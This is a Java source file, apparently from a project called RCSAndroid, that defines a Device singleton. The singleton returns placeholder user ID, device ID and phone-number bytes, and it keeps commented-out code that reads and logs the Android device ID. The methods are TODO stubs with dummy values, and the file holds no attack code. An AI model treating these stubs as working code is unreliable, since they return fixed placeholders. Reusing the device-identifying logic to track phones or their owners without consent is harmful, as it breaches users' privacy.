/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 06-dec-2010
 **********************************************/
package com.ht.RCSAndroidGUI;

import com.ht.RCSAndroidGUI.utils.Check;
import com.ht.RCSAndroidGUI.utils.Utils;
import com.ht.RCSAndroidGUI.utils.WChar;

import android.content.ContentResolver;

public class Device {
	private ContentResolver contentResolver;
	private String androidId;

	public void init(ContentResolver cr) throws RCSException {
		if (cr == null) {
			throw new RCSException("ContentResolver Invalid");
		}

		this.contentResolver = cr;
	}

	private volatile static Device singleton;

	public static Device self() {
		if (singleton == null) {
			synchronized (Device.class) {
				if (singleton == null) {

					singleton = new Device();

				}
			}
		}

		return singleton;
	}

	public byte[] getWUserId() {
		// TODO 
		return WChar.getBytes("MyUSERId");
	}

	public byte[] getWDeviceId() {
		// TODO 
		return WChar.getBytes("MyDEVId");
	}

	public byte[] getWPhoneNumber() {
		// TODO 
		return WChar.getBytes("+123456");
	}

	public byte[] getVersion() {
		 final byte[] versionRet = Utils.intToByteArray(Version.VERSION);
	        //#ifdef DBC
	        Check.ensures(versionRet.length == 4, "Wrong version len");
	        //#endif
	        return versionRet;
	}

	/*
	 * public void init() throws RCSException { this.androidId =
	 * Secure.getString(this.contentResolver, Secure.ANDROID_ID);
	 * 
	 * for (int i = 0; i < this.g_InstanceId.length; i++) { this.g_InstanceId[i]
	 * = 0; }
	 * 
	 * if (this.androidId.length() > this.g_InstanceId.length) { throw new
	 * RCSException("Android ID too long"); }
	 * 
	 * System.arraycopy(this.androidId.getBytes(), 0, this.g_InstanceId, 0,
	 * this.androidId.getBytes().length);
	 * 
	 * Log.d("RCS", "Device Unique ID: " + androidId); }
	 * 
	 * public byte[] getUniqueId() throws RCSException { if
	 * (this.androidId.length() == 0) { throw new
	 * RCSException("Object not yet initialized"); }
	 * 
	 * byte[] uniqueId = new byte[this.androidId.length()];
	 * 
	 * System.arraycopy(this.g_InstanceId, 0, uniqueId, 0, uniqueId.length);
	 * 
	 * return uniqueId; }
	 */
}
